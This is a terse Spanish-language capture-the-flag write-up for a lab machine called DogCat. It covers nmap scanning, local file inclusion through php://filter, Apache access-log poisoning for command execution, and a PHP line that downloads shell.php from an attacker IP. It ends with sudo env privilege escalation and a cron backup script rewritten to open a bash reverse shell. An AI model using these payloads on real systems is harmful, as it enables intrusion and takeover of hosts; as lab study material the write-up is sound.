# DogCat 🐶🐱

Security, Owasp top 10, Cron. (#nmap, #lfi, #gobuster, #session #javascript, #curl, #ssh2python.py, #linpeas.sh, #upload_file_nc.sh )

## Tabla de contenido

- [Enumeración](#Enumeración).
- [Web Site](#Web-Site).
- [Shell](#Shell). 


--------------------------------
### Enumeración
-------------------------------
Hacemos una revisión general:
```plain
nmap -sC -sV -oN nmap/initial 10.10.211.49
```

* -oN: Guardar el sondeo en formato normal.
* -sC: Realizar análisis con los scripts por defecto.
* -sV: Detección de la versión de servicios.

--------------------------------
### LFI
-------------------------------
Notamos que está funcionando el filter - LFI

https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/

```
http://10.10.211.49/?view=php://filter/convert.base64-encode/resource=dog
```

```
echo "PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
```

```
http://10.10.211.49/?view=php://filter/convert.base64-encode/resource=dog/../index
```

```
echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 -d > index.php

cat index.php
```


En el escaneo se aprecia un servicio apache 
```
/?view=./dog/../../../../../../../var/log/apache2/access.log&ext
```


http://10.10.211.49/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=ls%20-l

http://10.10.211.49/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=cat%20flag.php

http://10.10.90.53/?view=../../../var/log/apache2/cat/../access.log&ext=

<?php file_put_contents('shell.php',file_get_contents('http://10.13.6.84/shell.php'))?>

escalating to root

wc flag.php

sudo -l 

sudo env /bin/sh

cd /opt/backups/
echo '#!/bin/bash' > backup.sh
echo 'bash -i >& /dev/tcp/10.13.6.84/9001 0>&1' >> backup.sh
